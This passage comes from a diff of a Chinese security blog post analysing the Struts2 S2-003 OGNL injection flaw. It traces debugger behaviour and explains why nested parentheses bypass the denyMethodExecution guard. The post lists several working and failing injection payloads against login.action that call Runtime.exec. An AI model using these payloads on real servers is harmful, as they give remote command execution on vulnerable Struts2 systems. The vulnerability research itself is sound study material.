+<p>这里呢,其实就是把外面的引号给去掉了,让我们这里的children[0]变为了ASTAssign类型,让我们在第一个getValue中就成功修改了<code>xwork.MethodAccessor.denyMethodExecution</code></p>
+<p><img src="/2021/11/08/S2-003/image-20210810130640812.png" alt="image-20210810130640812"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810130817695.png" alt="image-20210810130817695"></p>
+<p>原本以为到了下面也会再执行一次的,但是返回回来的expr为false,node计算出来为null,也就不会在node.getValue时执行我们的<code>java code</code>了</p>
+<p>继续来说说为什么我们要加那么多括号,</p>
+<p>这里我们先做个假设,我们将payload写成这样,看看会发生什么</p>
+<pre><code class="java">(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)&amp;(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+</code></pre>
+<p>n为ASTAssign类型,但是setValue方法中调用的是ASTAssign#setValue方法,而不是getValue方法.但是只有调用ASTAssign#getValue方法才能执行我们的命令。</p>
+<p><img src="/2021/11/08/S2-003/image-20210810131755792.png" alt="image-20210810131755792"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810131804776.png" alt="image-20210810131804776"></p>
+<p>正常payload中的n:</p>
+<p><img src="/2021/11/08/S2-003/image-20210810132040126.png" alt="image-20210810132040126"></p>
+<p>现在得出结论:</p>
+<blockquote>
+<p>在Ognl#setValue中只会调用setValue方法,不会调用<code>ASTAssign#getValue</code>方法。</p>
+<p>但是在ASTEval#setValue中会调用成员的getValue方法,所以这里是传入一个ASTEval类型的成员n,然后间接调用<code>ASTAssign#getValue</code></p>
+</blockquote>
+<h1 id="深入理解Payload"><a href="#深入理解Payload" class="headerlink" title="深入理解Payload"></a>深入理解Payload</h1><p>这里其实有很多种方式调用ASTEval#getValue,这里给大家说一下我的理解:</p>
+<p>首先我们要排除一种特殊情况,就是我最最开始的那种payload,因为我们加了引号,所以我们一直到了node.getValue才执行我们的payload,因为这种情况比较特殊,也会影响我们总结,而且也不知道source=null时执行到某些地方时会不会报错,所以暂时不做讨论。</p>
+<p><img src="/2021/11/08/S2-003/image-20210810095602037.png" alt="image-20210810095602037"></p>
+<p><img src="/2021/11/08/S2-003/image-20210811114732175.png" alt="image-20210811114732175"></p>
+<p>这里我们假设我们有四个括号,其实你会发现无论按什么样的顺序写都能执行<code>ASTAssign#getValue</code>,这里我们会依次执行one.getValue,two.getValue …….</p>
+<p><img src="/2021/11/08/S2-003/image-20210810153821484.png" alt="image-20210810153821484"></p>
+<p>真正让我们无法执行命令的情况,那就是报错了。假如我们把我们的<code>java code</code>写到three的位置,但是one和two的getValue方法执行过程中报错了,那就自然无法执行到three.getValue</p>
+<p>那么什么情况会报错呢。目前我发现了有一种情况:那就是expr为null的时候,也就是当我们的children[0]为<code>&quot;bal&quot;</code>的时候。<code>expr=null</code>在执行<code>Node node = expr instanceof Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());</code>会跳出循环,去判断我们传的下一个参数。假设我们的payload写成:</p>
+<pre><code class="java">(bla)(bla)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)&amp;(bla)(bla)(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+//也就是(one)(two)(java code)格式
+</code></pre>
+<p>那就无法执行到我们的<code>java code</code></p>
+<p><img src="/2021/11/08/S2-003/image-20210810160437612.png" alt="image-20210810160437612"></p>
+<p>执行<code>Node node = expr instanceof Node ? (Node)expr : (Node)Ognl.parseExpression(expr.toString());</code>会跳出循环</p>
+<p><img src="/2021/11/08/S2-003/image-20210810155947522.png" alt="image-20210810155947522"></p>
+<p>这里随便写几个payload,方便一下大家深入理解里面的逻辑:</p>
+<pre><code class="java">可行的:
+
+login.action?(bla)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)&amp;(bla)(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+
+login.action?(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+
+login.action?(bla)((bla)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse))&amp;(bla)(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+
+login.action?(bla)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)(bla)(bla)(bla)(bla)&amp;(bla)(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+
+不行的:
+
+login.action?(bla)((bla)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse))(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))
+</code></pre>
+<p>调试的时候又发现了一种特殊情况,比如这里我们的payload:</p>
+<pre><code class="java">login.action?(fuck)(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)(bla)&amp;(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))(fuck)(fuck)
+</code></pre>
+<p>它又执行不起了,因为在经过拦截器时,这里传入参数的顺序变了,这里先是去解析<code>(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))(fuck)(fuck)</code>,然后才去修改<code>xwork.MethodAccessor.denyMethodExecution</code>,自然无法执行方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810144418034.png" alt="image-20210810144418034"></p>
+<p>此外我还遇到了些其他情况也会导致我们<code>parameters</code>中传入的参数顺序不理想,比如多在第一个参数两边没加引号,第二个参数两边加了个引号之类的。因为不知道服务器端是如何处理我们的请求的,所以我也不知道具体是什么原因。大家测试的时候如果要传两个参数进来,注意尽量写成一样的格式就行。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://zhzhdoai.github.io/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-003/#0x01" target="_blank" rel="noopener">https://zhzhdoai.github.io/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-003/#0x01</a></p>
+<p><a href="https://xz.aliyun.com/t/7966#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7966#toc-4</a></p>
+<p><a href="https://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/" target="_blank" rel="noopener">https://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/</a></p>
+<p><a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
+<p><a href="https://xz.aliyun.com/t/111#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/111#toc-0</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -634,36 +490,19 @@ public class CC71 {
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/07/13/CC链学习-下/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\2.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\2.png">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                CC链学习-下</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/07/13/CC链学习-上/" rel="next">
+            <a href="/2021/11/08/搜集的博客/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\1.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\1.png">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\4.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\4.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                CC链学习-上</h3>
+                搜集的博客</h3>
                 <hr>
               </div>
             </a>
